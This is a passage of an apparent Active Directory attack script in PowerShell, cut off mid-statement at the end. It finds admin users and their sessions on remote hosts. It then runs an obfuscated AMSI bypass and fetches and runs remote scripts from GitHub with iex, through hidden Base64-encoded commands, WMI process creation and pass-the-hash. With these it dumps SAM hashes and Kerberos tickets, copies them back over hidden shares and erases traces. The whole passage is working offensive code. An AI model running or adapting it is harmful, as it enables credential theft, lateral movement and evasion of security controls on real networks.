$EnterpriseAdmins = (Get-ADGroupMember -Identity "Enterprise Admins" -Recursive | select-object -ExpandProperty SamAccountName)

$AllAdminGroups = (Get-ADGroup -Filter 'Name -like "*admin*"' | select-object -ExpandProperty Name)

Write-Host "Domain Admins: (Recursive)" -ForegroundColor Yellow;
$DomainAdmins

Write-Host ""
Write-Host "Enterprise Admins: (Recursive)" -ForegroundColor Yellow;
$EnterpriseAdmins

##### Merge content of Domain and Enterprise admins into one variable

$DomainAdminsArray = $DomainAdmins -split "\r?\n"
$EnterpriseAdminsArray = $EnterpriseAdmins -split "\r?\n"
$AllAdminUsers = $DomainAdminsArray + $EnterpriseAdminsArray
$AllAdminUsersString = $AllAdminUsers -join "`n"

##### Sort Unique

$AllAdminUsers = ($AllAdminUsers | Sort-Object | Get-Unique)

##### Check Against Sessions
Write-Host ""
Write-Host "Domain and Enterprise Admins Sessions:" -ForegroundColor Yellow

$matchFound = $false

$LogObject = ($LogObject | Out-String) -split "`n"

$AllAdminUsers | ForEach-Object {
    # Check if the current line exists in the second file
    $line = $LogObject | Select-String -SimpleMatch $_
    if($line) {
        # If the line exists, print it
		Write-Output $line | Select-Object -ExpandProperty Line | Format-Table
		$matchFound = $true
    }
}

if(-not $matchFound) {
    Write-Host "No Admin Sessions"
}

# Groups Containing the word Admin (Except..)
$AllAdminGroups = $AllAdminGroups | Where-Object {-not ($_ -cmatch "Domain Admins")}
$AllAdminGroups = $AllAdminGroups | Where-Object {-not ($_ -cmatch "Enterprise Admins")}

$AllAdminGroupsUsersList = foreach($AllAdminGroupsUser in $AllAdminGroups){
	Get-ADGroupMember -Identity "$AllAdminGroupsUser" -Recursive | select-object -ExpandProperty SamAccountName
}

$AllAdminGroupsUsersList = $AllAdminGroupsUsersList | Sort-Object | Get-Unique

foreach($DAEAAdminUser in $AllAdminUsers){
	$AllAdminGroupsUsersList = $AllAdminGroupsUsersList | Where-Object {-not ($_ -cmatch "$DAEAAdminUser")}
}

Write-Host ""
Write-Host "Other interesting Sessions:" -ForegroundColor Yellow

$matchFound = $false

$AllAdminGroupsUsersList | ForEach-Object {
    # Check if the current line exists in the second file
    $line = $LogObject | Select-String -SimpleMatch $_
    if($line) {
        # If the line exists, print it
		Write-Output $line | Select-Object -ExpandProperty Line | Format-Table
		$matchFound = $true
    }
}

if(-not $matchFound) {
    Write-Host "None"
}

Write-Host ""
Write-Host "######################"
Write-Host "#" -ForegroundColor Red -NoNewline;
Write-Host " Hashes and Tickets " -NoNewline;
Write-Host "#" -ForegroundColor Red;
Write-Host "######################"
Write-Host ""

# Dumping SAM from remote

if($Username.Contains(".\") -AND $HASHorPassword -eq "HASH"){}

else{
	Write-Host "Attempting to dump SAM from targets..." -ForegroundColor Yellow
	#iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1") > $null
	#iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')
	<# $PwshModule = (Get-Module)
	if($PwshModule -Like "*dynamic*code*module*Microsoft*"){}
	else{
		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
		Import-ActiveDirectory
	} #>

	$SAMTargets = $null
	$SAMTargets = $WMITargets
	
	<# $DomainControllers = (Get-ADDomainController | Select-Object -ExpandProperty Name)
	foreach($DomainController in $DomainControllers){
		$SAMTargets = ($SAMTargets | Where-Object {$_ -notlike "$DomainController*"})
	} #>
	
	if($Username){

		if($HASHorPassword -eq "Password"){
			
			if($Username.Contains(".\")){
				foreach ($SAMTarget in $SAMTargets) {
					$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget -d=$SAMTarget -u=$SMBExecUsername -p=$Password"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
					$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
					Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
				}
			}
			
			else{
				foreach ($SAMTarget in $SAMTargets) {
					$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
					$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
					Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
				}
			}
		}
		
		elseif($HASHorPassword -eq "HASH"){
			if($Username.Contains(".\")){}
			else{
				foreach ($SAMTarget in $SAMTargets) {
					$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
					$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
					Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
				}
			}
		}
		
		elseif($HASHorPassword -eq "Ticket"){
			foreach ($SAMTarget in $SAMTargets) {
				$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
				$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
				Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
			}
		}
	}

	else{
		foreach ($SAMTarget in $SAMTargets) {
			$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command `"-target=$SAMTarget`" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
			$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
			Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
		}
	}

	Write-Host "Done..."
	Write-Host ""
}

######### Dumping Tickets and Hashes from targets

Write-Host "Dumping Tickets and Hashes from targets..." -ForegroundColor Yellow

if($Username){
	if($HASHorPassword -eq "Password"){
		
		if($Username.Contains(".\")){
			
			# Dump Hashes and Tickets locally on remote machine
			
			$WMITargets | ForEach-Object {
			
				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/dumper.ps1`") *> c:\Users\Public\$eightrandom\$_.txt"
				
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp.txt`" -Value $base64command"
				
				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
				
				$processCommand = "powershell.exe -ep bypass -enc $base64command2"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
				
				Start-Sleep 1
				
				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
				
				$processCommand2 = "powershell.exe -Command $Command2"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
				
				Start-Sleep 2
				
				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
				
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$processCommand = "powershell.exe -ep bypass -enc $base64command"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
			
			}
			
			Start-Sleep -Seconds 20
			
			# Retrieve the file from remote machine
			
			$retrieveticketsjob = $WMITargets | ForEach-Object {
				Start-Job -ScriptBlock {
					param($pwd, $eightrandom, $WMITarget)
					cp \\$WMITarget\$eightrandom$\$WMITarget.txt $pwd\.
				} -ArgumentList $pwd, $eightrandom, $_
			}
			
			Wait-Job $retrieveticketsjob > $null
			
			Remove-Job $retrieveticketsjob > $null
			
			Write-Host "Tickets retrieved..."
			
		}
		
		else{
			
			$WMITargets | ForEach-Object {
			
				$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom"
		
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$processCommand = "powershell.exe -ep bypass -enc $base64command"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
				
				Start-Sleep 1
					
				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/dumper.ps1`") *> c:\Users\Public\$eightrandom\$_.txt"
				
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp.txt`" -Value $base64command"
				
				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
				
				$processCommand = "powershell.exe -ep bypass -enc $base64command2"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
				
				Start-Sleep 1
				
				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
				
				$processCommand2 = "powershell.exe -Command $Command2"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
				
				Start-Sleep 2
				
				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
				
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$processCommand = "powershell.exe -ep bypass -enc $base64command"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
			
			}
			
			Start-Sleep -Seconds 2
			
			$WMITargets | ForEach-Object {
				New-SmbMapping -RemotePath "\\$_\$eightrandom$" -Username "$UserName" -Password "$Password" -ErrorAction SilentlyContinue > $null
			}
			
			Start-Sleep -Seconds 20
			
			$retrieveticketsjob = $WMITargets | ForEach-Object {
				Start-Job -ScriptBlock {
					param($pwd, $eightrandom, $WMITarget)
					cp \\$WMITarget\$eightrandom$\$WMITarget.txt $pwd\.
				} -ArgumentList $pwd, $eightrandom, $_
			}
			
			Wait-Job $retrieveticketsjob > $null
			
			Remove-Job $retrieveticketsjob > $null
			
			Write-Host "Tickets retrieved..."
			
		}
		
	}
	
	elseif($HASHorPassword -eq "HASH"){
		
		if($Username.Contains(".\")){
				
			# Dump Hashes and Tickets locally on remote machine
				
			$dumpinghashesjob = $WMITargets | ForEach-Object {
				
				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/dumper.ps1`") *> c:\Users\Public\$eightrandom\$_.txt"
				
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp.txt`" -Value $base64command"
				
				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
				
				$FinalCommand = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
				
				$commandtoencode2 = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
				
				$base64command3 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode2))
				
				Start-Job -ScriptBlock {
					param($pwd, $base64command2, $FinalCommand, $base64command3, $SMBExecUsername, $DomainHASH, $WMITarget)
					S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Exc.ps1')
					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command2"
					Start-Sleep 1
					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -Command $FinalCommand"
					Start-Sleep 2
					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command3"
				} -ArgumentList $pwd, $base64command2, $FinalCommand, $base64command3, $SMBExecUsername, $DomainHASH, $_
			}

			Wait-Job $dumpinghashesjob > $null
			
			Remove-Job $dumpinghashesjob > $null
			
			Start-Sleep -Seconds 20
			
			# Retrieve the file from remote machine
				
			$retrievejob = $WMITargets | ForEach-Object {
				Start-Job -ScriptBlock {
					param($pwd, $SMBExecUsername, $DomainHASH, $eightrandom, $WMITarget)
					del $pwd\$WMITarget.txt
					S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Client.ps1')
					Invoke-Client -Username $SMBExecUsername -Hash $DomainHASH -Action Get -Source \\$WMITarget\$eightrandom$\$WMITarget.txt -Destination $pwd\$WMITarget.txt > $null
				} -ArgumentList $pwd, $SMBExecUsername, $DomainHASH, $eightrandom, $_
			}

			Wait-Job $retrievejob > $null
			
			Remove-Job $retrievejob > $null
			
			Write-Host "Tickets retrieved..."
			
		}
		
		else{
			
			$WMITargets | ForEach-Object {
			
				$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom"
		
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$processCommand = "powershell.exe -ep bypass -enc $base64command"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
				
				Start-Sleep 1
					
				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/dumper.ps1`") *> c:\Users\Public\$eightrandom\$_.txt"
				
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp.txt`" -Value $base64command"
				
				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
				
				$processCommand = "powershell.exe -ep bypass -enc $base64command2"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
				
				Start-Sleep 1
				
				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
				
				$processCommand2 = "powershell.exe -Command $Command2"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
				
				Start-Sleep 2
				
				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
				
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$processCommand = "powershell.exe -ep bypass -enc $base64command"
				
				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
				
			}
			
			Start-Sleep -Seconds 2
			
			$WMITargets | ForEach-Object {
				New-SmbMapping -RemotePath "\\$_\$eightrandom$" -ErrorAction SilentlyContinue > $null
			}
			
			Start-Sleep -Seconds 20
			
			$retrieveticketsjob = $WMITargets | ForEach-Object {
				Start-Job -ScriptBlock {
					param($pwd, $eightrandom, $WMITarget)
					cp \\$WMITarget\$eightrandom$\$WMITarget.txt $pwd\.
				} -ArgumentList $pwd, $eightrandom, $_
			}
			
			Wait-Job $retrieveticketsjob > $null
			
			Remove-Job $retrieveticketsjob > $null
			
			Write-Host "Tickets retrieved..."

		}
		
	}
	
	elseif($HASHorPassword -eq "Ticket"){
		
		$WMITargets | ForEach-Object {
			
			$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom"
		
			$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
			
			$processCommand = "powershell.exe -ep bypass -enc $base64command"
			
			Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
			
			Start-Sleep 1
				
			$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/dumper.ps1`") *> c:\Users\Public\$eightrandom\$_.txt"
			
			$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
			
			$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp.txt`" -Value $base64command"
			
			$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
			
			$processCommand = "powershell.exe -ep bypass -enc $base64command2"
			
			Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
			
			Start-Sleep 1
			
			$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
			
			$processCommand2 = "powershell.exe -Command $Command2"
			
			Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
			
			Start-Sleep 2
			
			$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
			
			$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
			
			$processCommand = "powershell.exe -ep bypass -enc $base64command"
			
			Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
		
		}
		
		Start-Sleep -Seconds 2
			
		$WMITargets | ForEach-Object {
			New-SmbMapping -RemotePath "\\$_\$eightrandom$" -ErrorAction SilentlyContinue > $null
		}
		
		Start-Sleep -Seconds 20
		
		$retrieveticketsjob = $WMITargets | ForEach-Object {
			Start-Job -ScriptBlock {
				param($pwd, $eightrandom, $WMITarget)
				cp \\$WMITarget\$eightrandom$\$WMITarget.txt $pwd\.
			} -ArgumentList $pwd, $eightrandom, $_
		}
		
		Wait-Job $retrieveticketsjob > $null
		
		Remove-Job $retrieveticketsjob > $null
		
		Write-Host "Tickets retrieved..."
		
	}
}

else{
	
	$WMITargets | ForEach-Object {
		
		$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom"
		
		$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
		
		$processCommand = "powershell.exe -ep bypass -enc $base64command"
		
		Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
		
		Start-Sleep 1
			
		$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/dumper.ps1`") *> c:\Users\Public\$eightrandom\$_.txt"
		
		$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
		
		$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp.txt`" -Value $base64command"
		
		$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
		
		$processCommand = "powershell.exe -ep bypass -enc $base64command2"
		
		Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
		
		Start-Sleep 1
		
		$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
		
		$processCommand2 = "powershell.exe -Command $Command2"
		
		Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
		
		Start-Sleep 2
		
		$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
		
		$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
		
		$processCommand = "powershell.exe -ep bypass -enc $base64command"
		
		Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
		
	}
	
	Start-Sleep -Seconds 2
			
	$WMITargets | ForEach-Object {
		New-SmbMapping -RemotePath "\\$_\$eightrandom$" -ErrorAction SilentlyContinue > $null
	}
	
	Start-Sleep -Seconds 20
	
	$retrieveticketsjob = $WMITargets | ForEach-Object {
		Start-Job -ScriptBlock {
			param($pwd, $eightrandom, $WMITarget)
			cp \\$WMITarget\$eightrandom$\$WMITarget.txt $pwd\.
		} -ArgumentList $pwd, $eightrandom, $_
	}
	
	Wait-Job $retrieveticketsjob > $null
	
	Remove-Job $retrieveticketsjob > $null
	
	Write-Host "Tickets retrieved..."

}

Write-Host ""

##### Check Against Tickets

Write-Host "Domain/Enterprise Admins UserName contained within following txt files:" -ForegroundColor Yellow

$matchFound = $false

$TicketsLogObject = $AllAdminUsers | ForEach-Object {
    foreach($WMITarget in $WMITargets){
		$targetticketfile = "$pwd\$WMITarget.txt"
		# Check if the current line exists in the second file
		$line = Get-Content $targetticketfile | Select-String -SimpleMatch $_
		if($line) {
			# If the line exists, print it
			[pscustomObject]@{
				FileName = $WMITarget.Replace(".$jcurrentdomain","")
				UserName = $_
			}
			$matchFound = $true
			
		}
	}
}

if($matchFound) {
    
	$TicketsLogObject | Format-Table

}

else{
    Write-Host "NoWhere"
	Write-Host ""
}

Write-Host "Other interesting UserNames contained within following txt files:" -ForegroundColor Yellow

$matchFound = $false

$TicketsLogObject = $AllAdminGroupsUsersList | ForEach-Object {
    foreach($WMITarget in $WMITargets){
		$targetticketfile = "$pwd\$WMITarget.txt"
		# Check if the current line exists in the second file
		$line = Get-Content $targetticketfile | Select-String -SimpleMatch $_
		if($line) {
			# If the line exists, print it
			[pscustomObject]@{
				FileName = $WMITarget.Replace(".$jcurrentdomain","")
				Username = $_
			}
			$matchFound = $true
			
		}
	}
}

if($matchFound) {
    
	$TicketsLogObject | Format-Table
	
}

else{
    Write-Host "NoWhere"
}

Write-Host ""

################# Clean up at the end

Write-Host "Cleaning up remote hosts..." -ForegroundColor Yellow

if($Username){

	if($HASHorPassword -eq "Password"){
		
		if($Username.Contains(".\")){
	
			$WMITargets | ForEach-Object {
					
				$commandtoencode = "net share $eightrandom$ /delete; del c:\Users\Public\$eightrandom\ -Recurse"
				
				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
				
				$processCommand = "powershell.exe -ep bypass -enc $base64command"
				
				Invoke-WmiMethod -ComputerName $_ -Credential $cred -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
				
				Remove-SMBMapping * -Force
				
			}
		}
		
		else{
			
			if($jtargetdomain){
				Invoke-Ribes -Command "asktgt /user:$RubUsername /domain:$jtargetdomain /password:$Password /ptt" > $null
			}
			
			else{
				Invoke-Ribes -Command "asktgt /user:$RubUsername /domain:$jcurrentdomain /password:$Password /ptt" > $null
			}
			
